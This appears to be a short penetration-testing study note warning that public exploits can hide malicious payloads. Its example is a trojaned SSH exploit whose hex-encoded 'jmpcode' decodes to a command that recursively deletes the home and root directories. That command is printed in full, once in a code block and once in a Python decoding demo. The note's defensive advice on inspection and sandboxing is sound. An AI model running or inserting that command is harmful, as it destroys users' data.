***NOTE***
By downloading and running public exploits, we can _**greatly**_ endanger any system that runs that code.  
Carefully read and understand the code before execution to ensure no negative effects.  
  
Ex:    **OpenOwn** (a remote exploit for SSH) asks for root privileges and has a _jmpcode_ array in it's payload.  
		This _jmpcode_ array is actually a hex-encoded string containing the malicious shell command:  
```bash
rm -rf ~ /* 2> /dev/null &
```
	  In the lines that followed, the program would connect to a public IRC server to announce the user's idiocy to the world.  
  
  
Using trustworthy exploit repositories is crucial. The online resources mentioned in the mats analyze submitted exploit code before hosting it online.  
  
Not to say you shouldn't read the code & verify everything's above board prior to execution.  
  
If code inspection or compilation is too complex, set up a vm w/ a clean snapshot as an exploit sandbox.  
  
  
Way to check shellcode:  
```python
python  
  
>>> jmpcode = [ "\x72\x6D.........."]  
>>> print jmpcode  
[  
rm -rf ~ /* 2> /dev/null &']  
>>> quit
```
